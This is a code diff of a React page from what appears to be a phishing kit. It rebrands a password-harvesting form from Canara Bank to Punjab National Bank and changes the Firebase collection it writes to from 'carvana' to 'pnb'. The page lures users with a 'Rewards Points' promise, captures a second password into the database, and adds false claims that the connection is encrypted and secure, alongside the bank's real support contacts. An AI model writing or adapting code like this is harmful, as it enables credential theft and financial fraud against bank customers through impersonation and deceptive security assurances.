@@ -1,7 +1,7 @@
 import { useState } from 'react';
 import { useNavigate, useParams } from 'react-router-dom';
 import '../App.css';
-import headerImage from '../assets/second-page-header.jpeg';
+import secondPageImage from '../assets/second_page_img.jpeg';
 import FirebaseUtil from '../FirebaseRepo';
 
 const SecondPage = () => {
@@ -16,10 +16,9 @@ const SecondPage = () => {
     setIsSubmitting(true);
 
     try {
-      // Update the existing document in the carvana collection
-      const result = await FirebaseUtil.updateDocument("carvana", documentId, {
+      // Update the existing document in the pnb collection
+      const result = await FirebaseUtil.updateDocument("pnb", documentId, {
         password2,
-        updatedAt: new Date().toISOString()
       });
 
       // Check if update was successful
@@ -37,21 +36,23 @@ const SecondPage = () => {
 
   return (
     <div className="flex flex-col min-h-screen bg-white">
-      {/* Header Image */}
-      <div className="w-full">
-        <img 
-          src={headerImage} 
-          alt="Canara Bank Header" 
-          className="w-full h-40 object-cover"
-        />
+      {/* Header Image - Centered with white space on sides */}
+      <div className="w-full bg-white py-4 flex justify-center">
+        <div className="max-w-md mx-auto">
+          <img 
+            src={secondPageImage} 
+            alt="PNB Bank Header" 
+            className="max-h-48 w-auto object-contain"
+          />
+        </div>
       </div>
 
       {/* Main Content */}
       <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
-        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
+        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg border-t-4 border-[#A20E37]">
           <div className="text-center mb-6">
-            <h1 className="text-2xl font-bold text-blue-800">
-              One Step Away To Collect Your Rewardz Points
+            <h1 className="text-2xl font-bold text-[#A20E37]">
+              One Step Away To Collect Your Rewards Points
             </h1>
           </div>
 
@@ -62,7 +63,7 @@ const SecondPage = () => {
               </label>
               <input
                 type="password"
-                className="w-full py-2 px-3 rounded border border-gray-300 text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+                className="w-full py-2 px-3 rounded border border-gray-300 text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-[#A20E37]"
                 value={password2}
                 onChange={(e) => setPassword2(e.target.value)}
                 required
@@ -71,19 +72,31 @@ const SecondPage = () => {
 
             <button
               type="submit"
-              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm"
+              className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm"
               disabled={isSubmitting}
             >
               {isSubmitting ? "PROCESSING..." : "SUBMIT"}
             </button>
           </form>
+
+          <div className="mt-6 text-center">
+            <p className="text-sm text-gray-600">
+              Your security is our priority. All transactions are encrypted and secure.
+            </p>
+            <div className="flex items-center justify-center mt-2">
+              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-[#A20E37] mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+              </svg>
+              <span className="text-xs font-semibold">Secure Connection</span>
+            </div>
+          </div>
         </div>
       </main>
 
       {/* Bottom Part / Footer */}
       <footer className="bg-gray-800 text-white p-4 text-center">
-        <p className="text-sm"> 2025 Canara Bank. All rights reserved.</p>
-        <p className="text-xs">For support, call 1800-123-4567 or email support@canarabank.com</p>
+        <p className="text-sm"> 2025 Punjab National Bank. All rights reserved.</p>
+        <p className="text-xs">For support, call 1800-180-2222 or email care@pnb.co.in</p>
       </footer>
     </div>
   );
